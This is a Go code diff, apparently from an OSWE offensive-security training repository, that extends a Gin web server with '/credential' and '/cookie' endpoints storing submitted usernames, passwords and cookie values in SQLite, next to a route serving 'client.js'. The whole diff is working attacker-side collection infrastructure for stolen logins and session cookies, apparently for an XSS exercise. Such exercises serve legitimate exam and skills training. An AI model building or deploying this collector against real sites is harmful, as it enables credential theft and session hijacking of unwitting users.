@@ -8,7 +8,7 @@ import (
 
 	"github.com/gin-contrib/cors"
 	"github.com/gin-gonic/gin"
-	
+
 	"github.com/iPhantasmic/OSWE/scripts/utils"
 )
 
@@ -36,9 +36,41 @@ func uploadContent(c *gin.Context) {
 	c.String(http.StatusCreated, "Content for URL: %s saved to %d", url, newId)
 }
 
+// Ex 10.6.4.2 - Extra Mile: API to save Credentials and Cookies
+func uploadCredential(c *gin.Context) {
+	user := c.PostForm("user")
+	pass := c.PostForm("pass")
+
+	utils.PrintInfo(fmt.Sprintf("Saving to DB for user: %s", user))
+	newId := InsertCredential(user, pass)
+	if newId == 0 {
+		c.String(http.StatusInternalServerError, "Failed to save new credential...")
+	}
+
+	utils.PrintSuccess(fmt.Sprintf("Saved to DB for credential: %s", user))
+	c.String(http.StatusCreated, "User: %s saved to %d", user, newId)
+}
+
+func uploadCookie(c *gin.Context) {
+	key := c.PostForm("key")
+	value := c.PostForm("value")
+
+	utils.PrintInfo(fmt.Sprintf("Saving to DB for cookie: %s", key))
+	newId := InsertCookie(key, value)
+	if newId == 0 {
+		c.String(http.StatusInternalServerError, "Failed to save new cookie...")
+	}
+
+	utils.PrintSuccess(fmt.Sprintf("Saved to DB for cookie: %s", key))
+	c.String(http.StatusCreated, "Cookie: %s saved to %d", key, newId)
+}
+
 func main() {
-	// connect to DB
+	// connect to DB and setup tables
 	utils.ConnectDB("./sqlite.db")
+	CreateContentTable()
+	CreateCredentialTable()
+	CreateCookieTable()
 
 	r := gin.Default()
 
@@ -50,7 +82,10 @@ func main() {
 	// define routes and corresponding handlers
 	r.GET("/health", health)
 	r.GET("/client.js", clientJS)
+
 	r.POST("/content", uploadContent)
+	r.POST("/credential", uploadCredential)
+	r.POST("/cookie", uploadCookie)
 
 	// load SSL certificate and key
 	certFile := "cert.pem"
